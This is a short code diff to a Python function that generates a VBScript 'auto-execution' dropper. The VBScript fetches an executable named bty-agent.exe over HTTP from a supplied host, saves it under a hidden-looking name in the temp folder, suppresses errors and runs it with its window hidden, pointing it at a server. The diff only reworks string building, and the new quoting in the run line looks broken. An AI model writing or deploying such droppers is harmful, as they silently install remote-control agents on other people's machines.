@@ -185,7 +185,7 @@ def generate_vbs(server, name=None):
     
     host, _, port = server.rsplit(":", 1) if ":" in server else (server, "", "8443")
     
-    vbs = f"""' BTY Auto-Execution VBScript
+    vbs = """' BTY Auto-Execution VBScript
 Set wsh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set http = CreateObject("MSXML2.XMLHTTP")
@@ -194,7 +194,7 @@ temp = wsh.ExpandEnvironmentStrings("%TEMP%")
 exe = temp & "\\.svc.exe"
 
 On Error Resume Next
-http.open "GET", "http://{host}:8000/bty-agent.exe", False
+http.open "GET", "http://""" + host + """:8000/bty-agent.exe", False
 http.send
 
 If http.Status = 200 Then
@@ -205,7 +205,7 @@ If http.Status = 200 Then
     stream.SaveToFile exe, 2
     stream.Close
     
-    wsh.Run """" & exe & """ --server {server}", 0, False
+    wsh.Run """""" & exe & """""" --server """ + server + """", 0, False
 End If
 """
     
